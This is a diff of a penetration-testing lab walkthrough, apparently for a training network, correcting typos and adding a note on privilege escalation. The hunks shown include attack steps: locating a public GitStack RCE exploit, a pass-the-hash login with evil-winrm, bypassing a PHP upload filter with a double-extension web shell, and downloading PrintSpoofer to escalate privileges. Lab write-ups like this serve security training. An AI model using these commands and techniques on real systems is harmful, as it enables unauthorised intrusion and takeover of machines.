@@ -148,7 +148,7 @@ Visit .150 website on the browser
 ### Administrator access on 10.200.90.150 (git-serv)
 
 RCE of gitstatck 2.3.10
-- Search the publi exploit: `searchsploit gitstack`
+- Search the public exploit: `searchsploit gitstack`
 	- Copy it to the cwd: `searchsploit -m php/webapps/43777.py`
 - Edit it: `vi 43777.py`
 ```
@@ -265,7 +265,7 @@ Enumerate .100 web app by proxychains and FoxyPRoxy in the Firefox
 	- Note: it's slowly loading the web on .100 due to the double port redirections by sshuttle and chisel.
 	- This website looks like a copy from the git server 10.200.90.150
 - Use whatweb to see the banners: `sudo proxychains whatweb http://10.200.90.100/`
-	- We see PHP/7.4.11
+	- We see `PHP/7.4.11`
 - On a new terminal: `evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.90.150`
 	- After examining the directory `c:\gitstack`, we found an intersting directory `C:\gitstack\repositories\Website.git`
 	- Download the Website.git in the evil-winrm: `download C:\gitstack\repositories\Website.git ./Website.git`
@@ -332,7 +332,7 @@ if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
 	die();
 ...
 ```
-- The explode() function in this file shows that as long as the file has one of those four images extensions. This means that we can legitimately upload shell.jpg.php that may contain php code. Also, getimagesize() function is checking for the attributes that only an image can have. This implies we also need any normal image as the payload holder.
+- The explode() function in this file shows that: as long as the file has one of those four images extensions, the server is going to accpet the file. This means that we can legitimately upload shell.jpg.php that may contain php code. Also, getimagesize() function is checking for the attributes that only an image can have. This implies we also need a normal image as the payload holder.
 - The structure of directories implies that there is web direcotry: `resources`
 
 Exploit the uploading vuln
@@ -361,6 +361,7 @@ sudo proxychains curl -u 'thomas:i<3ruby' "http://10.200.90.100/resources/upload
 
 ### PE on 10.200.90.100 (wreath-pc) - Method 1: PrintSpoofer
 
+- Since we see that the current user `thomas` has the privilege `SeImpersonatePrivilege`, we can try PrintSpoofer PE.
 Transfer PrintSpoofer64.exe to the target
 - Download the binary from the public repo: `wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe`
 - Transfer from Kali to the target
